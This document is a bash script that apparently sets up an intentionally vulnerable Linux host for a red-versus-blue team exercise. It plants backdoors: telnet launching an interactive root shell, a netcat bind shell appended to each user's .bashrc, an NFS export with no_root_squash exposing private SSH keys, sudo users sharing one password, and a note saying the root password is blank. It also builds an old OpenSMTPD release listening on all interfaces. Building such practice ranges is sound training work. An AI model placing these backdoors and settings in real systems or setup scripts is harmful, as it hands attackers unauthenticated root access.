#!/bin/bash

# telnet  to root shell
sudo apt update
sudo apt-get install telnetd -y
touch /usr/local/bin/telnet
echo "#!/bin/bash" > /usr/local/bin/telnet
echo "exec /bin/bash -i" >> /usr/local/bin/telnet
chmod +x /usr/local/bin/telnet
sudo systemctl restart inetutils-inetd
sudo iptables -A INPUT -p tcp --dport 23 -j ACCEPT
echo "telnet stream tcp nowait root /usr/sbin/telnetd telnetd -E  /usr/local/bin/telnet" >> /etc/inetd.conf

#nfs with ssh keys and creds
sudo apt install nfs-kernel-server -y
mkdir -p /srv/nfs
echo "/srv/nfs *(rw,sync,no_root_squash,no_subtree_check)" | sudo tee -a /etc/exports
sudo systemctl restart nfs-kernel-server

USERS=("aiden" "redhead" "megamind" "izzabizzradio" "maggiegz" "owendraingang" "dhrupad")
PASSWORD="Blueteamsux123!"

for USER in "${USERS[@]}"; do
  sudo useradd -m "$USER"
  sudo usermod -aG sudo "$USER"
  echo "$USER:$PASSWORD" | sudo chpasswd
done

for USER in "${USERS[@]}"; do
  sudo mkdir -p /home/$USER/.ssh
done

sudo mkdir -p /srv/nfs/.ssh

for USER in "${USERS[@]}"; do
  sudo ssh-keygen -t rsa -f /srv/nfs/.ssh/${USER}_id_rsa -N ""
  sudo cp /srv/nfs/.ssh/${USER}_id_rsa.pub /home/$USER/.ssh/authorized_keys
  sudo chown $USER:$USER /home/$USER/.ssh/authorized_keys
  sudo chmod 600 /home/$USER/.ssh/authorized_keys
  
  # bind shell in .bashrc
  echo -e "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f & disown" | sudo tee -a /home/$USER/.bashrc
done

sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT

# root password in share
touch /srv/nfs/reminder
echo "in case you forget root password is blank" > /srv/nfs/reminder

# ftp maybe
#sudo apt install vsftpd -y
#sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.bak
#sudo tee /etc/vsftpd.conf > /dev/null << EOT
#listen=YES
#anonymous_enable=YES
#anon_upload_enable=YES
#anon_mkdir_write_enable=YES
#anon_other_write_enable=YES
#anon_root=/var/ftp
#local_enable=YES
#write_enable=YES
#local_umask=022
#dirmessage_enable=YES
#use_localtime=YES
#xferlog_enable=YES
#connect_from_port_20=YES
#secure_chroot_dir=/var/run/vsftpd/empty
#pam_service_name=vsftpd
#EOT

# Create FTP directories
#sudo mkdir -p /var/ftp/pub
#sudo chmod 777 -R /var/ftp/pub
#sudo systemctl restart vsftpd
#sudo systemctl enable vsftpd



sudo apt update
sudo apt install -y build-essential libtool automake libevent-dev zlib1g-dev bison libssl-dev libdb-dev git wget


wget https://github.com/OpenSMTPD/OpenSMTPD/releases/download/6.6.1p1/opensmtpd-6.6.1p1.tar.gz
tar -xzf opensmtpd-6.6.1p1.tar.gz
cd opensmtpd-6.6.1p1

# Install libasr if needed
if [ ! -f /usr/lib/libasr.so ]; then
  cd ..
  git clone https://github.com/OpenSMTPD/libasr.git
  cd libasr
  ./bootstrap
  ./configure
  make
  sudo make install
  sudo ldconfig
  cd ../opensmtpd-6.6.1p1
fi

# Configure with flags to fix the multiple definition errors
./bootstrap
./configure --with-cflags="-fcommon"
make
sudo make install

useradd -c "SMTP Daemon" -d /var/empty -s /sbin/nologin _smtpd
useradd -c "SMTPD Queue" -d /var/empty -s /sbin/nologin _smtpq
mkdir -p /var/empty
sudo iptables -A INPUT -p tcp --dport 25 -j ACCEPT
sudo mkdir -p /etc/mail
sudo touch /etc/mail/aliases
sudo rm /usr/local/etc/smtpd.conf

for USER in "${USERS[@]}"; do
  echo "$USER: $USER@ccso.org" | sudo tee -a /etc/mail/aliases > /dev/null
done

sudo tee /usr/local/etc/smtpd.conf <<EOF
#       \$OpenBSD: smtpd.conf,v 1.10 2018/05/24 11:40:17 gilles Exp $

# This is the smtpd server system-wide configuration file.
# See smtpd.conf(5) for more information.

table aliases file:/etc/mail/aliases

# To accept external mail, replace with: listen on all
listen on 0.0.0.0

action "local" mbox alias <aliases>
action "relay" relay

# Uncomment the following to accept external mail for domain "example.org"
# match from any for domain "example.org" action "local"
match for local action "local"
match from local for any action "relay"
EOF

sudo tee /etc/systemd/system/opensmtpd.service <<EOF
[Unit]
Description=OpenSMTPD Mail Server
After=network.target

[Service]
ExecStart=/usr/local/sbin/smtpd
ExecReload=/bin/kill -HUP \$MAINPID
Type=forking
PIDFile=/var/run/opensmtpd.pid
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable inetutils-inetd
sudo systemctl start inetutils-inetd
sudo systemctl enable nfs-kernel-server
sudo systemctl start nfs-kernel-server
sudo systemctl daemon-reload
sudo systemctl enable opensmtpd
sudo systemctl start opensmtpd
